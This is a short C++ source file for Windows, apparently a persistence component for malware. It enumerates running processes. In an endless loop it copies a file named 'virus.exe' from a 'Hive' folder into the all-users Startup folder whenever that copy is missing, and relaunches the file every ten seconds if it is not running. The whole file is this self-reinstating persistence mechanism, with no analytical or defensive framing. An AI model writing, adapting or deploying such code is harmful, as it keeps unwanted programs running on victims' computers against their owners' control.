#include <fstream>
#include <iostream>
#include <unistd.h> //sleep
#include <dstring.h> //windows processes
#include <tlhelp32.h> //windows processes

//typedef void* HANDLE;
bool FindRunningProcess(AnsiString process) {
/*
Function takes in a string value for the process it is looking for like ST3Monitor.exe
then loops through all of the processes that are currently running on windows.
If the process is found it is running, therefore the function returns true.
*/
    AnsiString compare;
    bool procRunning = false;

    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        procRunning = false;
    } else {
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnap, &pe32)) { // Gets first running process
            if (pe32.szExeFile == process) {
                procRunning = true;
            } else {
                // loop through all running processes looking for process
                while (Process32Next(hProcessSnap, &pe32)) { 
                    // Set to an AnsiString instead of Char[] to make compare easier
                    compare = pe32.szExeFile;
                    if (compare == process) {
                        // if found process is running, set to true and break from loop
                        procRunning = true;
                        break;
                    }
                }
            }
            // clean the snapshot object
            CloseHandle(hProcessSnap);
        }
    }

    return procRunning;
}

int main() {

    const std::string worker_egg_file_name = "virus.exe";
    const std::string worker_egg_dest = "C:\\Program Files\\Hive\\" + worker_egg_file_name; //may be messed up because of space

    const std::string worker_exe_file_name = "virus.exe";
    const std::string startup_dest = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" + worker_exe_file_name;

    std::ifstream src;
    std::ofstream dst;
 
    for (;;) { //cursed while loop formating
        src.open(startup_dest);
        if(!src) { //if worker.exe is not at startup
            src.close();
            src.open(worker_egg_dest);
            dst.open(startup_dest);
            dst << src.rdbuf();
            dst.close();
            std::cout<< "touched by GOD" <<std::endl;
        }
        src.close();

        if(!FindRunningProcess(worker_exe_file_name))
            std::system(startup_dest);

        std::cout<<"in"<<std::endl;
        sleep(10);
    }
    return 0;
}

